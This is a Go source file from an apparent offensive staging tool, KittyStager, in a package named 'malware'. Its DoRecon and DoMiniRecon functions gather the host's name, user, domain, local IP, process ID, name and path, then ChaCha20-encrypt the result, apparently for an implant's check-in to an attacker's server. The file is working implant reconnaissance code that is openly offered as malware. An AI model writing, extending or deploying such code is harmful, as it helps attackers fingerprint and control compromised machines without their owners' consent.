package malware

import (
	"KittyStager/internal/recon"
	"KittyStager/pkg/crypto"
	"net"
	"os"
)

func DoRecon(key string) ([]byte, error) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	//get username
	username := os.Getenv("USERNAME")

	//get domain
	domain := os.Getenv("USERDOMAIN")
	//get local ip
	ip := getLocalIP()

	//process
	//pid
	pid := os.Getpid()
	//process name
	pName := os.Args[0]
	//current path
	currentPath, _ := os.Getwd()
	r := recon.NewRecon(hostname,
		username,
		domain,
		ip,
		pName,
		currentPath,
		pid,
	)
	task, err := r.MarshallTask()
	if err != nil {
		return nil, err
	}
	c := crypto.NewChaCha20()
	// when
	e, err := c.Encrypt(task, []byte(key))
	if err != nil {
		return nil, err
	}
	return e, nil
}

func DoMiniRecon(key string) ([]byte, error) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	//get local ip
	ip := getLocalIP()
	r := recon.NewRecon(
		hostname,
		"",
		"",
		ip,
		"",
		"",
		0,
	)
	task, err := r.MarshallTask()
	if err != nil {
		return nil, err
	}
	c := crypto.NewChaCha20()
	// when
	e, err := c.Encrypt(task, []byte(key))
	if err != nil {
		return nil, err
	}
	return e, nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "100.100.100.100:3480")
	if err != nil {
		return ""
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr).IP.String()
	return localAddr
}
